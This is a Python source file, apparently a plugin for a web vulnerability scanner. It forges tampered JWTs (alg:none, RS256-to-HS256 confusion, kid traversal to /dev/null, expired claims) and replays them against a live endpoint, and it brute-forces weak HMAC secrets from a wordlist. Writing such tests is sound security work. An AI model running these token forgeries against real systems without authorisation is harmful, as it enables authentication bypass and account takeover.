"""JWT / token security attack plugin.

When the scan carries a JWT (an ``Authorization: Bearer`` header or a session
cookie), replay tampered variants against a protected endpoint and see whether
the server accepts them. Covers the classic, high-impact flaws:

* ``alg:none``               - signature stripped, still accepted.
* RS256->HS256 confusion     - re-signed with the server's RSA public key.
* ``kid`` path traversal     - key resolved to an empty file (``/dev/null``).
* weak HMAC secret           - offline brute-force of the signing key.
* claim enforcement          - expired ``exp`` accepted (checked via alg:none).

All acceptance decisions go through a single canary channel: the configured
``--logged-in-check`` string when present, otherwise a comparison against the
authenticated baseline response. The plugin no-ops when no JWT is present, so
it never fires false positives on tokenless targets. (OWASP API2, CWE-347.)
"""

from __future__ import annotations

import json

from requests.utils import dict_from_cookiejar

from sitadel.config.settings import Risk
from sitadel.request.request import SingleRequest
from sitadel.utils.container import Services
from .. import AttackPlugin
from . import jwtutils as ju

# Small built-in fallback list so weak-secret detection works out of the box.
_FALLBACK_SECRETS = [
    "secret", "password", "changeme", "admin", "jwt", "test", "key",
    "your-256-bit-secret", "supersecret", "123456", "s3cr3t",
]
# Bad enough to be worth flagging even when the endpoint can't be validated.
_STATUS_UNAUTHORIZED = (401, 403)


class Jwt(AttackPlugin):
    # Tampering + replay against a live endpoint is exploitation-stage.
    level = Risk.DANGEROUS

    def process(self, start_url, crawled_urls):
        output = Services.get("output")
        request = Services.get("request_factory")
        logger = Services.get("logger")

        tokens = self._discover(request)
        if not tokens:
            output.info(
                "No JWT found in the session (Authorization bearer / cookie); "
                "skipping JWT tests"
            )
            return

        output.info("Checking JWT / token security...")
        secrets = self._load_secrets()
        for loc in tokens:
            try:
                self._test_token(loc, start_url, request, secrets, output, logger)
            except Exception as err:  # one bad token must not abort the scan
                logger.error(err)
                output.debug("JWT test error: %s" % err)

    # ------------------------------------------------------------------ #
    # Discovery
    # ------------------------------------------------------------------ #
    @staticmethod
    def _discover(request):
        auth = getattr(request, "authenticator", None)
        headers = dict(auth.headers) if auth is not None else {}
        cookies = {}
        session = getattr(request, "session", None)
        if session is not None:
            try:
                cookies = dict_from_cookiejar(session.cookies)
            except Exception:
                cookies = {}
        return ju.discover_tokens(headers, cookies)

    def _load_secrets(self):
        try:
            datastore = Services.get("datastore")
            with datastore.open("jwt-secrets.txt", "r") as fh:
                words = [line.rstrip("\n") for line in fh if line.strip()]
            if words:
                return words
        except Exception:
            pass
        return list(_FALLBACK_SECRETS)

    # ------------------------------------------------------------------ #
    # Replay + acceptance channel
    # ------------------------------------------------------------------ #
    def _replay(self, endpoint, loc, new_token, request):
        """Send ``new_token`` in the same location the original was found."""
        fresh = SingleRequest(
            timeout=getattr(request, "timeout", None),
            verify=getattr(request, "verify", False),
            redirect=getattr(request, "redirect", True),
        )
        if loc.kind == "header":
            headers = {loc.name: f"{loc.prefix}{new_token}"}
            return fresh.send(url=endpoint, method="GET", headers=headers)
        fresh.session.cookies.set(loc.name, new_token)
        return fresh.send(url=endpoint, method="GET")

    @staticmethod
    def _bodies_match(a, b, tolerance=0.1):
        if not a or not b:
            return False
        longest = max(len(a), len(b))
        if longest < 50:
            return a == b
        return abs(len(a) - len(b)) / longest <= tolerance

    def _accepted(self, resp, baseline, auth):
        """Whether a tampered token was accepted (i.e. treated as logged in)."""
        if resp is None or resp.status_code in _STATUS_UNAUTHORIZED:
            return False
        # Prefer the explicit logged-in canary when configured.
        if auth is not None and getattr(auth, "logged_in_check", None):
            return not auth.looks_logged_out(resp)
        if baseline is None:
            return False
        return (
            resp.status_code == baseline.status_code
            and resp.status_code < 400
            and self._bodies_match(resp.text, baseline.text)
        )

    # ------------------------------------------------------------------ #
    # Per-token test battery
    # ------------------------------------------------------------------ #
    def _test_token(self, loc, endpoint, request, secrets, output, logger):
        auth = getattr(request, "authenticator", None)
        token = loc.token
        where = f"{loc.kind} '{loc.name}'"

        # Offline weak-secret brute never needs the server: run it first.
        if ju.is_hmac_alg(token):
            secret = ju.brute_hmac_secret(token, secrets)
            if secret is not None:
                output.finding(
                    "JWT signed with a weak/guessable HMAC secret (%s) in %s: "
                    "'%s' - full token forgery is possible (CWE-347, API2)"
                    % (ju.decode_header(token).get("alg"), where, secret),
                    severity=self._sev("critical"),
                    url=endpoint,
                    plugin="Jwt",
                )

        # Establish the authenticated baseline for the replay-based tests.
        baseline = self._replay(endpoint, loc, token, request)
        has_canary = auth is not None and getattr(auth, "logged_in_check", None)
        if has_canary:
            # The canary must actually match the untampered baseline, else we
            # cannot trust it to tell "accepted" from "rejected".
            can_validate = baseline is not None and self._accepted(baseline, None, auth)
        else:
            can_validate = baseline is not None and baseline.status_code < 400
        if not can_validate:
            output.info(
                "Cannot validate JWT replay for %s (no authenticated baseline / "
                "no --logged-in-check); ran offline checks only" % where
            )
            return

        # alg:none - signature not verified.
        none_accepted = False
        for header_alg in ("none", "None", "NONE"):
            claims = ju.decode_claims(token)
            forged = ju.forge_alg_none(token, claims=claims)
            # Re-mangle the header alg casing for the variant under test.
            forged = self._retag_alg(forged, header_alg)
            resp = self._replay(endpoint, loc, forged, request)
            if self._accepted(resp, baseline, auth):
                none_accepted = True
                output.finding(
                    "JWT 'alg:%s' accepted in %s: the signature is not verified, "
                    "allowing authentication bypass (CWE-347, API2)"
                    % (header_alg, where),
                    severity=self._sev("critical"),
                    url=endpoint,
                    plugin="Jwt",
                )
                break

        # Claim enforcement: an expired token minted via alg:none is accepted.
        if none_accepted:
            expired = dict(ju.decode_claims(token))
            expired["exp"] = 1  # 1970 - long expired
            forged = ju.forge_alg_none(token, claims=expired)
            resp = self._replay(endpoint, loc, forged, request)
            if self._accepted(resp, baseline, auth):
                output.finding(
                    "JWT 'exp' claim is not enforced in %s: an expired token is "
                    "accepted (CWE-613/CWE-347)" % where,
                    severity=self._sev("high"),
                    url=endpoint,
                    plugin="Jwt",
                )

        # kid path-traversal to an empty key.
        forged = ju.forge_kid_empty(token)
        resp = self._replay(endpoint, loc, forged, request)
        if self._accepted(resp, baseline, auth):
            output.finding(
                "JWT 'kid' path traversal accepted in %s: key resolves to an "
                "empty file, so an empty-key HMAC token is honoured (CWE-347)"
                % where,
                severity=self._sev("high"),
                url=endpoint,
                plugin="Jwt",
            )

        # RS256->HS256 algorithm confusion (best effort: needs the public key).
        if ju.is_rsa_alg(token):
            pem = self._fetch_public_key(endpoint, request, logger)
            if pem:
                forged = ju.forge_confusion(token, pem)
                resp = self._replay(endpoint, loc, forged, request)
                if self._accepted(resp, baseline, auth):
                    output.finding(
                        "JWT RS256->HS256 algorithm confusion accepted in %s: the "
                        "RSA public key is honoured as an HMAC secret (CWE-347)"
                        % where,
                        severity=self._sev("critical"),
                        url=endpoint,
                        plugin="Jwt",
                    )

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #
    @staticmethod
    def _sev(name):
        """Return a Severity if the report enum is available, else a string.

        Keeps the plugin working whether or not the finding-quality severity
        enrichment is present in this build.
        """
        try:
            from sitadel.report import Severity
            return getattr(Severity, name.upper())
        except Exception:
            return name

    @staticmethod
    def _retag_alg(forged_token, alg):
        """Rewrite the ``alg`` value in a forged token's header segment."""
        head_seg, rest = forged_token.split(".", 1)
        header = json.loads(ju.b64url_decode(head_seg))
        header["alg"] = alg
        return f"{ju.b64url_encode(json.dumps(header, separators=(',', ':')))}.{rest}"

    def _fetch_public_key(self, endpoint, request, logger):
        """Best-effort fetch of an RSA public key from common JWKS endpoints."""
        from urllib.parse import urlsplit
        parts = urlsplit(endpoint)
        origin = f"{parts.scheme}://{parts.netloc}"
        fresh = SingleRequest(
            timeout=getattr(request, "timeout", None),
            verify=getattr(request, "verify", False),
        )
        for path in ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration"):
            try:
                resp = fresh.send(url=origin + path, method="GET")
            except Exception:
                continue
            if resp is None or resp.status_code != 200:
                continue
            pem = self._jwks_to_pem(resp.text)
            if pem:
                return pem
        return None

    @staticmethod
    def _jwks_to_pem(body):
        try:
            data = json.loads(body)
        except Exception:
            return None
        keys = data.get("keys") if isinstance(data, dict) else None
        if not keys:
            return None
        for jwk in keys:
            if jwk.get("kty") != "RSA":
                continue
            try:
                from jwt.algorithms import RSAAlgorithm
                from cryptography.hazmat.primitives import serialization
                key = RSAAlgorithm.from_jwk(json.dumps(jwk))
                pem = key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo,
                )
                return pem.decode("ascii")
            except Exception:
                continue
        return None
